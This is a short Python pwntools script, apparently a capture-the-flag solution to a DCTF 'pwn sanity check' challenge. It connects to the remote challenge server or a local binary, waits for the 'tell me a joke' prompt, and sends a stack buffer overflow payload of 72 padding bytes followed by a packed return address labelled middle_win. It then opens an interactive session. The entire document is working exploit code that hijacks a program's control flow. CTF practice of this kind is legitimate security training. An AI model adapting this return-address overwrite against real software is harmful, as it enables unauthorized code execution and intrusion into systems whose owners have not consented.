from pwn import *

middle_win = p64(0x00000000004006DB)
rem = 1

if(rem):
    p = remote("dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io", 7480)
else:
    p = process("pwn_sanity_check")

print(p.recvuntil("tell me a joke").decode())
p.sendline(b"A"* 64 + b"B" * 8 + middle_win)

p.interactive()